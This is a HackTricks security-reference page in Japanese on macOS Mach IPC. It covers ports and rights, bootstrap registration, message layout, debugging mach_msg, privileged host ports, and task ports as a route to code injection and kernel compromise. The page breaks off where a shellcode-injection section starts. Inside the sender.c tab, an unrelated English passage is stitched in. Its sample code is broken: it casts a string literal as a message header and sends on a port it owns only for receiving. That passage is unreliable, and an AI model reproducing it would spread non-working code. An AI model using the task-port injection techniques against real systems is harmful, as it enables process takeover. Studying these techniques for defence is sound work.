# macOS IPC - プロセス間通信

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加**したり、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)を**フォロー**する
- **ハッキングトリックを共有するために** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する

</details>

## ポートを介したMachメッセージング

### 基本情報

Machはリソースを共有するための**最小単位としてタスク**を使用し、各タスクには**複数のスレッド**が含まれることができます。これらの**タスクとスレッドは、1:1でPOSIXプロセスとスレッドにマップ**されます。

タスク間の通信は、Machインタープロセス通信（IPC）を介して行われ、カーネルによって管理される**メッセージキューのように機能するポート間でメッセージが転送**されます。

**ポート**はMach IPCの**基本要素**です。これを使用して**メッセージを送信および受信**することができます。

各プロセスには**IPCテーブル**があり、そこには**プロセスのMachポート**が見つかります。Machポートの名前は実際には数値（カーネルオブジェクトへのポインタ）です。

プロセスはまた、ポート名といくつかの権限を**異なるタスクに送信**することができ、カーネルはこれを他のタスクの**IPCテーブルにエントリとして登録**します。

### ポート権限

タスクが実行できる操作を定義するポート権限は、この通信に重要です。可能な**ポート権限**は以下の通りです（[ここからの定義](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)）：

- **受信権限**：ポートに送信されたメッセージを受信する権限。MachポートはMPSC（multiple-producer, single-consumer）キューであり、システム全体で**各ポートにつき1つの受信権限しか存在しない**（複数のプロセスが1つのパイプの読み取り端に対するファイルディスクリプタを保持できるパイプとは異なります）。
- **受信権限を持つタスク**はメッセージを受信し、**送信権限を作成**できるようになり、メッセージを送信できるようになります。元々は**自分のタスクだけがポートに対して受信権限を持っていました**。
- 受信権限の所有者が**死亡**したり、削除した場合、**送信権限は無効になります（デッドネーム）**。
- **送信権限**：ポートにメッセージを送信する権限。
- 送信権限は**クローン**できるため、送信権限を所有するタスクは権限を複製し、**第三のタスクに付与**できます。
- **ポート権限**はMacメッセージを介しても**渡す**ことができます。
- **一度だけ送信権限**：ポートに1つのメッセージを送信し、その後消える権限。
- この権限は**クローン**できませんが、**移動**できます。
- **ポートセット権限**：単一のポートではなく_ポートセット_を示す権限。ポートセットからメッセージをデキューすると、それが含むポートの1つからメッセージがデキューされます。ポートセットは、Unixの`select`/`poll`/`epoll`/`kqueue`のように複数のポートで同時にリッスンするために使用できます。
- **デッドネーム**：実際のポート権限ではなく、単なるプレースホルダーです。ポートが破棄されると、ポートへのすべての既存のポート権限がデッドネームに変わります。

**タスクはSEND権限を他のタスクに転送**して、メッセージを返信できるようにします。**SEND権限はクローン**できるため、タスクは権限を複製して**第三のタスクに権限を与える**ことができます。これにより、**ブートストラップサーバ**と呼ばれる中間プロセスと組み合わせることで、タスク間の効果的な通信が可能となります。

### ファイルポート

ファイルポートは、Macポート（Machポート権限を使用）でファイルディスクリプタをカプセル化することを可能にします。指定されたFDから`fileport_makeport`を使用して`fileport`を作成し、`fileport_makefd`を使用してファイルポートからFDを作成することができます。

### 通信の確立

前述のように、Machメッセージを使用して権限を送信することが可能ですが、**Machメッセージを送信する権限がない場合は権限を送信することはできません**。では、最初の通信はどのように確立されるのでしょうか？

このために、**ブートストラップサーバ**（macでは**launchd**）が関与します。**誰でもブートストラップサーバにSEND権限を取得**できるため、他のプロセスにメッセージを送信する権限を要求することができます：

1. タスク**A**は**新しいポート**を作成し、そのポートに対する**受信権限**を取得します。
2. 受信権限の所有者であるタスク**A**は、ポートに対する**送信権限を生成**します。
3. タスク**A**は**ブートストラップサーバ**と**接続**し、最初に生成したポートの**送信権限をブートストラップサーバに送信**します。
   - 誰でもブートストラップサーバにSEND権限を取得できることを覚えておいてください。
4. タスクAは`bootstrap_register`メッセージをブートストラップサーバに送信して、`com.apple.taska`のような名前で指定されたポートを**関連付け**します。
5. タスク**B**は**ブートストラップサーバ**とやり取りして、サービス名（`bootstrap_lookup`）の**ブートストラップ検索**を実行します。ブートストラップサーバが応答するために、タスクBは検索メッセージ内で以前に作成した**ポートに対するSEND権限**をブートストラップサーバに送信します。検索が成功すると、**サーバはTask Aから受け取ったSEND権限を複製**し、**Task Bに送信**します。
   - 誰でもブートストラップサーバにSEND権限を取得できることを覚えておいてください。
6. このSEND権限を使用して、**Task B**は**Task A**に**メッセージを送信**できます。
7. 双方向通信のために通常、タスク**B**は**受信**権限と**送信**権限を持つ新しいポートを生成し、**SEND権限をTask Aに渡す**ことで、Task Bにメッセージを送信できるようにします（双方向通信）。

ブートストラップサーバは、タスクが主張するサービス名を認証できません。これは、**タスク**が潜在的に**任意のシステムタスクをなりすます**可能性があることを意味します。たとえば、認証サービス名を偽って**承認リクエストを承認**することができます。

その後、Appleは**システム提供サービスの名前**を、**SIPで保護された**ディレクトリにあるセキュアな構成ファイルに保存しています：`/System/Library/LaunchDaemons`および`/System/Library/LaunchAgents`。ブートストラップサーバは、これらのサービス名ごとに**受信権限を作成**し、保持します。

これらの事前定義されたサービスについては、**検索プロセスがわずかに異なります**。サービス名が検索されると、launchdはサービスを動的に開始します。新しいワークフローは次のとおりです：

- タスク**B**はサービス名のためにブートストラップ**検索**を開始します。
- **launchd**はタスクが実行されているかどうかをチェックし、実行されていない場合は**起動**します。
- タスク**A**（サービス）は**ブートストラップチェックイン**（`bootstrap_check_in()`）を実行します。ここで、**ブートストラップ**サーバはSEND権限を作成し、保持し、**受信権限をTask Aに転送**します。
- launchdは**SEND権限を複製**し、Task Bに送信します。
- タスク**B**は**受信**権限と**送信**権限を持つ新しいポートを生成し、**Task A**（svc）に**SEND権限を渡します**（Task Bにメッセージを送信できるようにするため）。

ただし、このプロセスは事前定義されたシステムタスクにのみ適用されます。非システムタスクは引き続き最初に説明されたように動作し、なりすましを許可する可能性があります。

{% hint style="danger" %}
したがって、launchdがクラッシュするとシステム全体がクラッシュします。
{% endhint %}
### Machメッセージ

[詳細はこちらを参照](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

`mach_msg`関数は、基本的にシステムコールであり、Machメッセージの送受信に使用されます。この関数は、送信するメッセージを最初の引数として必要とします。このメッセージは、`mach_msg_header_t`構造体で始まり、実際のメッセージ内容が続きます。この構造体は以下のように定義されています:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
プロセスは _**受信権**_ を持っていると、Mach ポートでメッセージを受信できます。逆に、**送信者** は _**送信権**_ または _**一度だけ送信権**_ を付与されます。一度だけ送信権は、1回のメッセージ送信後に無効になります。

初期フィールド **`msgh_bits`** はビットマップです:

* 最初のビット（最も重要なビット）は、メッセージが複雑であることを示すために使用されます（後述）
* 3番目と4番目はカーネルによって使用されます
* 2番目のバイトの**最下位5ビット** は **バウチャー** に使用できます: キー/値の組み合わせを送信するための別のポートの種類。
* 3番目のバイトの**最下位5ビット** は **ローカルポート** に使用できます
* 4番目のバイトの**最下位5ビット** は **リモートポート** に使用できます

バウチャー、ローカルポート、リモートポートに指定できるタイプは、[**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) から次のとおりです:
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
たとえば、`MACH_MSG_TYPE_MAKE_SEND_ONCE`は、このポートに対して派生および転送されるべき**send-once right**を示すために使用できます。受信者がこのメッセージに返信できないようにするために`MACH_PORT_NULL`を指定することもできます。

簡単な**双方向通信**を実現するために、プロセスは_mach message header_内の**返信ポート**(**`msgh_local_port`**)と呼ばれる**mach port**を指定できます。メッセージの受信者はこのメッセージに返信することができます。

{% hint style="success" %}
この種の双方向通信は、リプライを期待するXPCメッセージで使用され、(`xpc_connection_send_message_with_reply`および`xpc_connection_send_message_with_reply_sync`)。ただし、通常は異なるポートが作成され、双方向通信が作成されるように説明されています。
{% endhint %}

メッセージヘッダーの他のフィールドは次のとおりです。

- `msgh_size`: パケット全体のサイズ。
- `msgh_remote_port`: このメッセージが送信されるポート。
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach\_vouchers.html)。
- `msgh_id`: 受信者によって解釈されるこのメッセージのID。

{% hint style="danger" %}
**machメッセージは`mach port`を介して送信される**ことに注意してください。これは、machカーネルに組み込まれた**単一の受信者**、**複数の送信者**通信チャネルです。**複数のプロセス**がmachポートに**メッセージを送信**できますが、いつでも**単一のプロセスだけが**それから読み取ることができます。
{% endhint %}

その後、メッセージは**`mach_msg_header_t`**ヘッダーに続く**本文**と**トレーラー**（ある場合）によって形成され、それに返信する権限を付与できます。この場合、カーネルは単にメッセージを1つのタスクからもう1つのタスクに渡す必要があります。

**トレーラー**は、**カーネルによってメッセージに追加される情報**（ユーザーによって設定されることはできません）であり、メッセージ受信時に`MACH_RCV_TRAILER_<trailer_opt>`フラグでリクエストできます（リクエストできる異なる情報があります）。

#### 複雑なメッセージ

ただし、追加のポート権限を渡すかメモリを共有するなど、より**複雑な**メッセージもあります。この場合、カーネルはこれらのオブジェクトを受信者に送信する必要があります。この場合、ヘッダー`msgh_bits`の最上位ビットが設定されます。

渡す可能性のある記述子は、[**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)で定義されています。
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
### MacポートAPI

ポートはタスク名前空間に関連付けられていることに注意してください。したがって、ポートを作成または検索するには、タスク名前空間もクエリされます（`mach/mach_port.h`で詳細を確認）：

- **`mach_port_allocate` | `mach_port_construct`**: ポートを**作成**します。
- `mach_port_allocate`は**ポートセット**を作成することもできます：ポートのグループに対する受信権利。メッセージを受信するたびに、それがどのポートから送信されたかが示されます。
- `mach_port_allocate_name`: ポートの名前を変更します（デフォルトは32ビット整数）
- `mach_port_names`: ターゲットからポート名を取得します
- `mach_port_type`: タスクが名前に対して持つ権利を取得します
- `mach_port_rename`: ポートの名前を変更します（FDのdup2のようなもの）
- `mach_port_allocate`: 新しいRECEIVE、PORT_SET、またはDEAD_NAMEを割り当てます
- `mach_port_insert_right`: 受信権限を持つポートに新しい権限を作成します
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: **machメッセージを送受信**するために使用される関数。上書きバージョンでは、メッセージ受信用に異なるバッファを指定できます（他のバージョンは再利用します）。

### デバッグ mach\_msg

関数**`mach_msg`**と**`mach_msg_overwrite`**はメッセージを送受信するために使用される関数であるため、これらにブレークポイントを設定すると、送信されたメッセージと受信されたメッセージを検査できます。

たとえば、デバッグできるアプリケーションをデバッグ開始すると、この関数を使用する**`libSystem.B`がロードされます**。

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 &#x3C;+0>:  pacibsp
0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
</code></pre>

**`mach_msg`**の引数を取得するには、レジスタを確認します。これらが引数です（[mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)から）:
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
レジストリから値を取得します:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
メッセージヘッダーを調査し、最初の引数をチェックします。
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
その種類の `mach_msg_bits_t` は、返信を許可するために非常に一般的です。



### ポートの列挙
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**名前** はポートにデフォルトで与えられる名前です（最初の3バイトで**増加**しているかを確認してください）。 **`ipc-object`** はポートの**難読化**された一意の**識別子**です。\
また、**`send`** 権限のみを持つポートは、それの所有者を**識別**しています（ポート名 + pid）。\
また、**`+`** を使用して、**同じポートに接続された他のタスク** を示すことに注意してください。

また、[**procesxp**](https://www.newosxbook.com/tools/procexp.html) を使用して、**登録されたサービス名**（`com.apple.system-task-port` の必要性により SIP が無効になっている）も表示することができます。
```
procesp 1 ports
```
iOS でこのツールをインストールするには、[http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) からダウンロードしてください。

### コード例

**sender** がポートを**割り当て**、名前 `org.darlinghq.example` の**送信権**を作成し、それを**ブートストラップサーバー**に送信する方法に注目してください。送信者はその名前の**送信権**を要求し、それを使用して**メッセージを送信**しました。

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}  
### macOS Inter-Process Communication (IPC)

macOS provides several mechanisms for inter-process communication (IPC), such as Mach ports, XPC services, and UNIX domain sockets. These mechanisms allow processes to communicate and share data with each other.

One common use case for IPC is to send messages or data between processes. This can be useful for implementing features like inter-application communication, service management, and more.

In this example, we demonstrate how to use Mach ports for IPC in macOS. Mach ports are a low-level IPC mechanism that allows processes to send messages to each other. By creating a Mach port and sending messages through it, processes can communicate and exchange data.

```c
// sender.c

#include <stdio.h>
#include <mach/mach.h>

int main() {
    mach_port_t port;
    kern_return_t kr;

    // Create a new Mach port
    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (kr != KERN_SUCCESS) {
        printf("Failed to create Mach port: %s\n", mach_error_string(kr));
        return 1;
    }

    printf("Created Mach port: %d\n", port);

    // Send a message through the Mach port
    kr = mach_msg((mach_msg_header_t *) "Hello, receiver!", MACH_SEND_MSG, sizeof("Hello, receiver!"), 0, port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
        printf("Failed to send message: %s\n", mach_error_string(kr));
        return 1;
    }

    printf("Message sent successfully\n");

    return 0;
}
```

In this code snippet, we first create a Mach port using `mach_port_allocate()`, then send a message through the port using `mach_msg()`. The receiver process would need to have a corresponding Mach port to receive the message sent by the sender.

This is a basic example of IPC using Mach ports in macOS. Depending on your use case, you may need to implement additional error handling and security measures to ensure the integrity and confidentiality of the communication between processes.  
{% endtab %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

## 特権ポート

特定の機密操作を実行したり、特定の機密データにアクセスしたりすることができる特別なポートがいくつかあります。これらのポートは、それらに対して**SEND**権限を持つタスクがある場合にのみ、非常に興味深いものとなります。これは、攻撃者の観点からだけでなく、**複数のタスク間でSEND権限を共有**できるためです。

### ホスト特別ポート

これらのポートは番号で表されます。

**SEND** 権限は、**`host_get_special_port`** を呼び出すことで取得でき、**RECEIVE** 権限は **`host_set_special_port`** を呼び出すことで取得できます。ただし、これらの呼び出しには **`host_priv`** ポートが必要であり、これにアクセスできるのは root のみです。さらに、過去には root が **`host_set_special_port`** を呼び出して任意のポートを乗っ取ることができ、たとえば `HOST_KEXTD_PORT` を乗っ取ることでコード署名をバイパスすることが可能でした（SIP がこれを防止しています）。

これらは 2 つのグループに分かれています: **最初の 7 つのポートはカーネルが所有**し、1 が `HOST_PORT`、2 が `HOST_PRIV_PORT`、3 が `HOST_IO_MASTER_PORT`、7 が `HOST_MAX_SPECIAL_KERNEL_PORT` です。\
**8** から始まるポートは **システムデーモンが所有**し、[**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host\_special\_ports.h.auto.html) で宣言されています。

* **Host port**: プロセスがこのポートに対して**SEND**権限を持っている場合、次のようなルーチンを呼び出すことで**システム**に関する**情報**を取得できます:
* `host_processor_info`: プロセッサ情報を取得
* `host_info`: ホスト情報を取得
* `host_virtual_physical_table_info`: 仮想/物理ページテーブル（MACH\_VMDEBUG が必要）
* `host_statistics`: ホスト統計情報を取得
* `mach_memory_info`: カーネルメモリレイアウトを取得
* **Host Priv port**: このポートに対して**SEND**権限を持つプロセスは、ブートデータを表示したり、カーネル拡張をロードしようとしたりするなど、**特権操作**を実行できます。この権限を取得するには、**プロセスは root である必要があります**。
* さらに、**`kext_request`** API を呼び出すには、Apple バイナリにのみ与えられる **`com.apple.private.kext*`** という他の権限が必要です。
* 呼び出すことができる他のルーチンには次のものがあります:
* `host_get_boot_info`: `machine_boot_info()` を取得
* `host_priv_statistics`: 特権統計情報を取得
* `vm_allocate_cpm`: 連続した物理メモリを割り当て
* `host_processors`: ホストプロセッサに対するSEND権限
* `mach_vm_wire`: メモリを常駐させる
* **root** はこの権限にアクセスできるため、`host_set_[special/exception]_port[s]` を呼び出して**ホストの特別ポートや例外ポートを乗っ取る**ことができます。

すべてのホスト特別ポートを表示することができます。
```bash
procexp all ports | grep "HSP"
```
### タスクポート

元々Machには「プロセス」ではなく「タスク」があり、これはスレッドのコンテナのように考えられていました。MachがBSDと統合された際、**各タスクはBSDプロセスと関連付けられました**。したがって、すべてのBSDプロセスにはプロセスであるために必要な詳細があり、すべてのMachタスクにも内部動作があります（ただし、存在しないpid 0は`kernel_task`です）。

これに関連する2つの非常に興味深い関数があります：

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: 指定された`pid`に関連するタスクのタスクポートのSEND権を取得し、指定された`target_task_port`（通常は`mach_task_self()`を使用した呼び出し元タスクですが、異なるタスク上のSENDポートでもかまいません）にそれを与えます。
- `pid_for_task(task, &pid)`: タスクへのSEND権を持つ場合、このタスクが関連付けられているPIDを見つけます。

タスク内でアクションを実行するためには、タスク自体に対する`SEND`権が必要で、`mach_task_self()`を呼び出すことでこれを取得します（これは`task_self_trap`（28）を使用します）。この権限を持つと、タスクは次のようなアクションを実行できます：

- `task_threads`: タスクのスレッドのすべてのタスクポートに対するSEND権を取得
- `task_info`: タスクに関する情報を取得
- `task_suspend/resume`: タスクを一時停止または再開
- `task_[get/set]_special_port`
- `thread_create`: スレッドを作成
- `task_[get/set]_state`: タスクの状態を制御
- その他、[**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)で見つけることができます。

{% hint style="danger" %}
異なるタスクのタスクポートに対するSEND権を持つと、異なるタスク上でそのようなアクションを実行できる可能性があります。
{% endhint %}

さらに、タスクポートは**`vm_map`**ポートでもあり、`vm_read()`や`vm_write()`などの関数を使用してタスク内のメモリを**読み取りおよび操作**できます。基本的に、異なるタスクのタスクポートに対するSEND権を持つタスクは、そのタスクに**コードをインジェクト**できることを意味します。

**カーネルもタスクである**ことを覚えておいてください。したがって、誰かが**`kernel_task`に対してSEND権限**を取得すると、カーネルに任意のコードを実行させることができます（ジェイルブレイク）。

- `mach_task_self()`を呼び出して、呼び出し元タスクのこのポートの**名前を取得**します。このポートは**`exec()`**を介してのみ**継承**されます。`fork()`で作成された新しいタスクは新しいタスクポートを取得します（特別なケースとして、`exec()`後のsuidバイナリではタスクも新しいタスクポートを取得します）。タスクを生成してそのポートを取得する唯一の方法は、`fork()`を実行しながら["port swap dance"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html)を実行することです。
- これらはポートへのアクセス制限です（バイナリ`AppleMobileFileIntegrity`の`macos_task_policy`から）：
  - アプリが**`com.apple.security.get-task-allow`権限**を持っている場合、**同じユーザーのプロセスがタスクポートにアクセス**できます（デバッグ用にXcodeによって一般的に追加されます）。**ノータリゼーション**プロセスはこれを本番リリースには許可しません。
  - **`com.apple.system-task-ports`**権限を持つアプリは、カーネルを除く**任意の**プロセスの**タスクポートを取得**できます。以前のバージョンでは**`task_for_pid-allow`**と呼ばれていました。これはAppleアプリケーションにのみ付与されます。
  - **Rootは、ハード化されていない**ランタイムでコンパイルされたアプリケーションのタスクポートにアクセスできます（Apple製品ではない）。

**タスク名ポート：**_タスクポート_の権限がないバージョン。タスクを参照しますが、制御することはできません。これを介して利用可能な唯一のものは、`task_info()`のようです。

### タスクポートを介したスレッドへのシェルコードインジェクション

シェルコードを取得できます：

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

